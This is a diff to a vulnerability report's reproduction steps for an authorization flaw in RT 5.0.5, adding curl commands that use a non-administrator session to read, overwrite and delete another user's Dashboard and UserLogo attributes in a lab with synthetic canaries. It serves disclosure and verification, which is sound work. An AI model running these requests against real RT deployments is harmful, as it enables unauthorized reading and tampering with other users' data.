@@ -51,38 +51,59 @@ The `RT::Attribute` ACL map defines permissions for only a limited set of Attrib
 ### Steps to Reproduce
 #### Reproduction: unauthorized read
 
-1. Deploy RT 5.0.5 in a disposable lab instance and set `RT_BASE` to the lab URL.
+1. Deploy RT 5.0.5 in a disposable lab instance and set `RT_BASE` to the lab URL, such as `http://127.0.0.1/rt`.
 2. Create synthetic users `attacker` and `victim`.
 3. Create victim-owned `Dashboard` and `UserLogo` Attributes containing harmless markers such as `SYNTHETIC-DASHBOARD-CANARY`.
-4. Confirm the attacker has no ownership, `AdminUsers`, or SuperUser rights over the victim.
+4. Confirm the attacker has no ownership, `AdminUsers`, or SuperUser rights over the victim. Log in as the synthetic attacker and export the lab-only session to `attacker.jar`.
 5. Request the victim-owned Dashboard Attribute:
 
    ```text
    GET /Prefs/Search.html?name=RT::Attribute-<SYNTHETIC_DASHBOARD_ATTRIBUTE_ID>
    ```
 
-6. Observe that the synthetic Dashboard description is rendered for the attacker.
+   ```bash
+   curl -sS -b attacker.jar \
+     "$RT_BASE/Prefs/Search.html?name=RT%3A%3AAttribute-<SYNTHETIC_DASHBOARD_ATTRIBUTE_ID>" \
+     -o dashboard-read.html
+   ```
+
+6. Vulnerable result: `dashboard-read.html` contains `SYNTHETIC-DASHBOARD-CANARY` in the rendered description.
 7. Repeat with the synthetic `UserLogo` Attribute and record whether its marker is exposed.
-8. Repeat with a mapped `SavedSearch` Attribute as a negative control; it should be denied.
+8. Repeat with a mapped `SavedSearch` Attribute as a negative control; it should be denied. Remove the synthetic test data afterward.
 
 
 #### Reproduction: unauthorized update and delete
 
 1. Use the same non-administrator attacker and a restorable synthetic victim Attribute.
-2. Submit the normal SavedSearch widget save action with a synthetic Attribute identifier and harmless marker:
+2. Submit the normal SavedSearch widget save action with a synthetic Attribute identifier and harmless marker. URL-encode the colon characters in the saved-search reference:
 
    ```text
-   GET /Search/Chart.html?SavedSearchLoad=RT::User-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchSave=1&SavedSearchDescription=SYNTHETIC-UPDATED-CANARY
+   GET /Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchSave=1&SavedSearchDescription=SYNTHETIC-UPDATED-CANARY
    ```
 
-3. Verify through the lab database or the owner view that the victim-owned Dashboard description changed.
+   ```bash
+   curl -sS -b attacker.jar -G "$RT_BASE/Search/Chart.html" \
+     --data-urlencode 'SavedSearchLoad=RT::User-<SYNTHETIC_VICTIM_ID>-SavedSearch-<SYNTHETIC_ATTRIBUTE_ID>' \
+     --data-urlencode 'SavedSearchSave=1' \
+     --data-urlencode 'SavedSearchDescription=SYNTHETIC-UPDATED-CANARY' \
+     -o update-result.html
+   ```
+
+3. Vulnerable result: the request succeeds and the lab database or victim's owner view shows `SYNTHETIC-UPDATED-CANARY` as the new Dashboard description.
 4. Submit the corresponding delete action for a separate synthetic UserLogo Attribute:
 
    ```text
-   GET /Search/Chart.html?SavedSearchLoad=RT::User-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchDelete=1
+   GET /Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchDelete=1
    ```
 
-5. Verify that the synthetic Attribute was removed, then restore the lab database snapshot.
+   ```bash
+   curl -sS -b attacker.jar -G "$RT_BASE/Search/Chart.html" \
+     --data-urlencode 'SavedSearchLoad=RT::User-<SYNTHETIC_VICTIM_ID>-SavedSearch-<SYNTHETIC_ATTRIBUTE_ID>' \
+     --data-urlencode 'SavedSearchDelete=1' \
+     -o delete-result.html
+   ```
+
+5. Vulnerable result: the synthetic `UserLogo` row is deleted. Verify by synthetic Attribute ID, then restore the lab database snapshot.
 6. Repeat against a restorable system `DefaultDashboard` canary and verify whether the system value changes.
 7. Repeat with an actual `SavedSearch` Attribute as a negative control; the explicit mapping should deny the operation.
 
